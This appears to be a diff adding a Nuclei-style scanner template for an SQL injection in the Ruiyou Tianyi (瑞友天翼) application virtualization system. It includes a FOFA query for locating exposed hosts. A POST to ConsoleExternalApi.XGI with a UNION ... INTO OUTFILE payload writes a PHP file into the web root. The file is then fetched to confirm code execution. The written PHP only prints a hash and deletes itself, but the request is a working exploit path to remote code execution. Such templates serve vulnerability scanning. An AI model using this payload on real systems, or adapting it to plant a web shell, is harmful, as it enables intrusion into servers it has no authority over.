@@ -1,0 +1,36 @@
+id: RYTY-ConsoleExternalApi-SQL
+
+info:
+  name: 瑞友天翼应用虚拟化系统-SQL导致RCE-ConsoleExternalApi.XGI
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query:  title="瑞友天翼－应用虚拟化系统"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Cookie: PHPSESSID=t50ep2hj6cj7cvoitlrp7noop7; CookieLanguageName=ZH-CN; think_language=zh-CN; UserAuthtype=0
+        Accept-Encoding: gzip
+        Content-Type: application/json
+
+        {
+        "account": "1' union select '<?php echo md5(\"123456\");unlink(__FILE__);?>',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\ceshi.xgi'#",
+        "userPwd": "1"
+        }
+
+      - |
+        GET /ceshi.xgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"adc3949ba59abbe56e057f20f88")
